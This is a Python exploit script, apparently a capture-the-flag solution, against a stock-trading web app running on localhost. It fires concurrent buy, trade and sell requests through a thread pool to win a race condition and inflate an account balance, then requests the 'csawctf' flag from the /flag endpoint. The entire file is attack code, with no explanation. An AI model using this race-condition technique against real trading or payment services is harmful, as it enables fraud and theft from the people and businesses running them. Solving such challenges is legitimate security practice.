import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://localhost:4657"

def make_request(path, data=None):
    if data:
        return requests.post(f"{TARGET}{path}", data=data)
    return requests.get(f"{TARGET}{path}")

def get_stocks():
    resp = make_request("/listCalls")
    return resp.json()

def buy_stock(key, stock):
    return make_request("/buy", {"key": key, "stock": stock})

def sell_stock(key, stock):
    return make_request("/sell", {"key": key, "stock": stock})

def trade_stock(key, stock1, stock2):
    return make_request("/trade", {"key": key, "stock": stock1, "stock1": stock2})

def get_balance(key):
    resp = make_request("/login", {"key": key})
    return resp.json()

def get_flag(key):
    return make_request("/flag", {"key": key})

def exploit():
    key = "hacker123"  # Our unique key
    stocks = get_stocks()

    # Find highest and lowest priced stocks
    sorted_stocks = sorted(stocks.items(), key=lambda x: x[1]["price"], reverse=True)
    high_stock = sorted_stocks[0][0]  # BURPSHARKHAT
    low_stock = sorted_stocks[-1][0]  # TWEETIFY

    print(f"Using stocks: High={high_stock}, Low={low_stock}")

    def buy_sell_cycle():
        # Buy expensive stock
        buy_stock(key, high_stock)
        # Trade expensive for cheap
        trade_stock(key, high_stock, low_stock)
        # Sell cheap stock
        sell_stock(key, low_stock)

    # Create multiple threads to exploit race condition
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for _ in range(100):  # Try multiple times
            futures.append(executor.submit(buy_sell_cycle))
            time.sleep(0.1)  # Small delay to avoid immediate throttling

            # Check balance periodically
            bal = get_balance(key)
            print(f"Current balance: {bal['balance']}")

            if bal['balance'] >= 9001:
                # Try to get flag
                flag = get_flag(key)
                print(f"Flag attempt result: {flag.text}")
                if "csawctf{" in flag.text:
                    print(f"Found flag: {flag.text}")
                    return flag.text

if __name__ == "__main__":
    exploit()

